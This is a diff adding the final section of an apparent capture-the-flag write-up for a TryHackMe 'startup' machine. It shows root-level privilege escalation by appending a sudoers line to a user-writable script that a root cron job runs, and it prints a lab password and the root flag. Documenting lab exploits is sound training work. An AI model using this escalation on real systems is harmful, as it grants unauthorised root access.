@@ -488,7 +488,117 @@ Here we'll find the second flag in the ```user.txt``` file which reads the follo
 
 ## Flag 3
 
+Before we root this machine we should upgrade the terminal to bash again with the following command.
 
+```python -c 'import pty;pty.spawn("/bin/bash")'```
+
+Now we can start to go through the directories we found earlier on Lennies home directory.
+
+We'll start by listing the contents of ```/home/lennie/Documents```.
+
+```
+lennie@startup:~$ ls -la ./Documents/
+total 20
+drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 .
+drwx------ 5 lennie lennie 4096 Jan  8 21:30 ..
+-rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
+-rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
+-rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
+```
+
+After reading these files, we realize none of them are useful to us.
+
+```
+lennie@startup:~$ cat ./Documents/concern.txt
+I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
+```
+
+```
+lennie@startup:~$ cat ./Documents/list.txt
+Shoppinglist: Cyberpunk 2077 | Milk | Dog food
+```
+
+```
+lennie@startup:~$ cat ./Documents/note.txt
+Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
+```
+
+Next we'll list the contents of the ```/home/lennie/scripts``` directory. Where we can find an empty text file named ```startup_list.txt``` and an interesting shell script owned by the root user named ```planner.sh``` and we can see that we have read and execute permissions for it.
+
+```
+lennie@startup:~$ ls -la ./scripts
+total 16
+drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
+drwx------ 5 lennie lennie 4096 Jan  9 18:30 ..
+-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
+-rw-r--r-- 1 root   root      1 Jan  9 18:32 startup_list.txt
+```
+
+If we read the bash script we'll see that it echoes the contents of the ```$LIST``` variable into the ```startup_list.txt``` file in this directory but more importantly runs another script called ```print.sh``` that can be found in the ```/etc``` directory.
+
+```
+lennie@startup:~$ cat ./scripts/planner.sh
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+```
+
+Taking a look at the ```print.sh``` file we can see it's owned by Lennie.
+
+```
+lennie@startup:~$ ls -la /etc/print.sh
+-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
+```
+
+Knowing that root calls this program we can leverage this vulnerability by adding our own commands to the script that will be executed with root priviledges.
+
+One thing we can do is add Lennie to the ```etc/sudoers``` file so that we can run any program as sudo ourselves.
+
+We'll do this by adding the following line to the ```print.sh``` file.
+
+```echo 'lennie ALL=(ALL) ALL' >> /etc/sudoers```
+
+When you're done the ```print.sh``` file should look like this...
+
+```
+lennie@startup:~$ cat /etc/print.sh
+#!/bin/bash
+echo 'lennie ALL=(ALL) ALL' >> /etc/sudoers
+```
+
+After about a minute or so a root cronjob should be executed and we can verify we have all sudo priviledges by running the ```sudo -l``` command.
+
+```
+lennie@startup:~$ sudo -l
+
+[sudo] password for lennie: c4ntg3t3n0ughsp1c3
+Matching Defaults entries for lennie on startup:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lennie may run the following commands on startup:
+    (ALL) ALL
+lennie@startup:~$
+```
+
+Now we can find the root flag by listing the contents of the ```/root``` directory as sudo.
+
+```
+lennie@startup:~$ sudo ls -la /root
+
+total 28
+drwx------  4 root root 4096 Nov 12  2020 .
+drwxr-xr-x 25 root root 4096 Jan  9 18:26 ..
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Nov 12  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   38 Nov 12  2020 root.txt
+drwx------  2 root root 4096 Nov 12  2020 .ssh
+```
+
+Finally reading the ```root.txt``` file we'll find the following flag.
+
+```THM{f963aaa6a430f210222158ae15c3d76d}```
 
 ---
 
